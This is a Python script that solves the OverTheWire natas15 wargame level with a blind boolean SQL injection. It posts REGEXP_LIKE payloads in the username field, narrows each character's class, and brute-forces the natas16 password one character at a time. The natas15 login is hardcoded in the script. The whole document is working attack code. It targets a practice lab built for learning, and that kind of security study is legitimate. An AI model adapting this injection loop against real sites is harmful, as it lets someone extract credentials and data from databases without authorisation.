from html.parser import HTMLParser
import requests
import string

target = "http://natas15.natas.labs.overthewire.org/"
# Replace with natas15 password
auth = ("natas15", "SdqIqBsFcz3yotlNYErZSZwblkm0lrvx")
password = ""
token = "This user exists"


def injection(prefix: str, nextChar: str):
    # LIKE "...%" COLLATE utf8mb4_0900_as_cs
    return {'username': f'natas16" AND REGEXP_LIKE(password, "^{prefix}{nextChar}[[:alnum:]]*", "c") AND "" LIKE "'}


for i in range(len(password), 32):  # 32-character password
    chosen_chaset = string.ascii_letters
    r = requests.post(target, injection(password, '[[:alpha:]]'), auth=auth)
    if token in r.text:
        r = requests.post(
            target, injection(password, '[[:upper:]]'), auth=auth)
        chosen_chaset = string.ascii_uppercase if token in r.text else string.ascii_lowercase
    else:
        chosen_chaset = string.digits
    best = None
    for char in chosen_chaset:
        r = requests.post(target, injection(password, char), auth=auth)
        if token in r.text:
            best = char
            break
    if best is None:
        print("Error, last request received: ", r.text)
        break
    password += char
    print(f"Progress: {password.ljust(32, '*')}")

print(f"Final password: {password}")
